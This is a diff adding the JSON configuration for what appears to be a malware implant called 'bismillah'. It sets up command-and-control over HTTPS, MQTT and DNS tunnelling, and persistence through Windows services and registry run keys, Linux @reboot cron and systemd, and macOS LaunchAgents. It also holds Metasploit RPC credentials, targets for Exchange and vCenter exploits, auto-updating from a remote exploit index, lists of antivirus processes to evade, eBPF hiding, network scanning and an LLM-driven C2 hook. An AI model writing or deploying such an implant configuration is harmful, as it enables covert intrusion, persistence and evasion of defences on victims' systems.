@@ -1,0 +1,124 @@
+{
+  "c2": {
+    "http": {
+      "host": "0.0.0.0",
+      "port": 8443,
+      "use_tls": true,
+      "cert_file": "/opt/bismillah_repo/certs/bismillah.crt",
+      "key_file": "/opt/bismillah_repo/certs/bismillah.key",
+      "aes_key": "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff",
+      "aes_iv": "0123456789abcdef0123456789abcdef",
+      "max_retries": 3,
+      "use_ws": true,
+      "tls_verify": false,
+      "mqtt_broker": "mqtt.example.com",
+      "mqtt_port": 8883,
+      "mqtt_topic": "bismillah/c2",
+      "mqtt_username": "mqtt_user",
+      "mqtt_password": "mqtt_pass"
+    },
+    "dns": {
+      "host": "0.0.0.0",
+      "port": 5353,
+      "domain": "c2.example.com",
+      "txt_chunk_size": 200,
+      "use_doh": true,
+      "doh_url": "https://cloudflare-dns.com/dns-query",
+      "doh_tls_verify": false,
+      "rotate_interval": 3600,
+      "dns_tunnel": {
+        "enabled": true,
+        "chunk_length": 40,
+        "max_subdomains": 5
+      }
+    },
+    "fallback_interval": 600
+  },
+  "persistence": {
+    "windows": {
+      "service_name": "BismillahSvc",
+      "registry_run_key": "BismillahRun",
+      "python_path": "C:\\Python39\\python.exe",
+      "script_path": "C:\\bismillah_repo\\bismillah.py",
+      "watchdog": true,
+      "enable_double_hollow": true
+    },
+    "linux": {
+      "systemd_service": "bismillah.service",
+      "script_path": "/opt/bismillah_repo/bismillah.py",
+      "cron_entry": "@reboot /usr/bin/python3 /opt/bismillah_repo/bismillah.py --stealth",
+      "watchdog": true,
+      "crontab_refresh_interval": 3600
+    },
+    "macos": {
+      "launchd_label": "com.bismillah.agent",
+      "plist_path": "~/Library/LaunchAgents/com.bismillah.agent.plist",
+      "script_path": "/opt/bismillah_repo/bismillah.py",
+      "watchdog": true,
+      "hidden_db": "~/Library/Application Support/.bismillah/persistence.db"
+    }
+  },
+  "exploits": {
+    "metasploit": {
+      "rpc_host": "127.0.0.1",
+      "rpc_port": 55552,
+      "rpc_user": "msf",
+      "rpc_pass": "P@ssw0rd!",
+      "timeout": 120
+    },
+    "impacket": {
+      "timeout": 60
+    },
+    "compatibility": {
+      "windows_min_build": 14393,
+      "exchange_min_version": "15.0.847.32",
+      "vmware_vcenter_versions": ["6.7", "7.0"]
+    },
+    "impatient_timeout": 60
+  },
+  "logging": {
+    "sqlite_db": "/opt/bismillah_repo/bismillah.db",
+    "aes_key": "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff",
+    "aes_iv": "0123456789abcdef0123456789abcdef",
+    "rotate": {
+      "max_size_mb": 50,
+      "backup_count": 10
+    },
+    "remote_syslog": {
+      "enabled": false,
+      "host": "192.168.1.100",
+      "port": 514
+    },
+    "ramdisk_path": "/dev/shm/bismillah_logs",
+    "log_retention_days": 7
+  },
+  "auto_update": {
+    "enabled": true,
+    "update_interval_hours": 4,
+    "remote_module_index": "https://example.org/remote_exploits/index.yaml"
+  },
+  "stealth": {
+    "interval": 120,
+    "windows_av": ["MsMpEng.exe", "AntimalwareService.exe", "McShield.exe", "sense.exe", "xagt.exe"],
+    "linux_av": ["clamd", "clamav", "freshclam", "chkrootkit", "rkhunter"],
+    "macos_av": ["fseventsd", "com.apple.amsdaemon", "kextd"],
+    "wp_drivers_table": true,
+    "bpf_hide": true
+  },
+  "recon": {
+    "nmap_subnet": "192.168.1.0/24",
+    "nmap_args": "-p 1-65535 --open -T4 -sV -sC",
+    "shodan_api_key": "",
+    "passivedns_api_key": "",
+    "wifi_interface": "wlan0",
+    "subdomains": ["www", "mail", "ftp", "dev", "vpn", "rdp"]
+  },
+  "ai_c2": {
+    "check_interval": 60,
+    "llm_endpoint": "http://localhost:8000/complete",
+    "llm_key": ""
+  },
+  "loader": {
+    "timeout": 180
+  }
+}
